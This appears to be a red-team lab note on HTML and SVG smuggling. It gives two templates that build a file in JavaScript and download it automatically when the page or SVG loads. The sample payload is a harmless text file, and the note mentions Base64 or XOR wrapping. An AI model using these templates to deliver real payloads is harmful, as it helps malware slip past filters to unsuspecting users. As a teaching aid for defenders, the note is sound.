HTML or SVG file containing blobs content of delivery files that gets downloaded when user navigate to HTML or SVG file. These blobs are compiled and downloaded by using JavaScript event handlers.
- Adversaries may wrap the payload in **Base64** or **XOR encryption** before rebuilt by JavaScript.
Example can be seen in `D:\Programming\RedTeamLabs` directory
```html
<!DOCTYPE html>

<html lang="en">
<head>
  <meta charset="UTF-8">
  <title>Auto Download</title>
</head>
<body>
  <p>Your download should begin automatically...</p>
  <script>
    window.addEventListener('DOMContentLoaded', () => {

      // 1. Create your Blob (example: plain text or JSON)
      const content = 'Hello, world! This file was generated automatically.';
      const blob = new Blob([content], { type: 'text/plain;charset=utf-8' });

      // 2. Generate a temporary URL for the Blob
      const url = URL.createObjectURL(blob);

      // 3. Create a hidden anchor element and trigger the download
      const a = document.createElement('a');
      a.href = url;
      a.download = 'example.txt'; // Desired filename
      document.body.appendChild(a);
      a.click();

      // 4. Clean up the DOM and release memory
      document.body.removeChild(a);
      setTimeout(() => URL.revokeObjectURL(url), 100);
    });
  </script>
</body>
</html>
```
SVG smuggling
```xml
<?xml version="1.0" encoding="UTF-8"?>
<svg xmlns="http://www.w3.org/2000/svg" width="400" height="200" viewBox="0 0 400 200">
  <g id="btn" style="cursor:pointer">
    <rect x="100" y="70" width="200" height="60" rx="8" fill="#4CAF50"/>
    <text x="200" y="106" font-family="sans-serif" font-size="16" fill="#fff" text-anchor="middle">Download File</text>
  </g>
  <script type="application/ecmascript"><![CDATA[
    const blob = new Blob(["Hello, world! Generated from an SVG."], { type: "text/plain;charset=utf-8" });
    const url = URL.createObjectURL(blob);

    function download() {
      const a = document.createElementNS("http://www.w3.org/1999/xhtml", "a");
      a.href = url;
      a.download = "example.txt";
      document.documentElement.appendChild(a);
      a.click();
      a.remove();
    }

    download();                                                   // fires on load
    document.getElementById("btn").addEventListener("click", download); // fallback
  ]]></script>
</svg>
```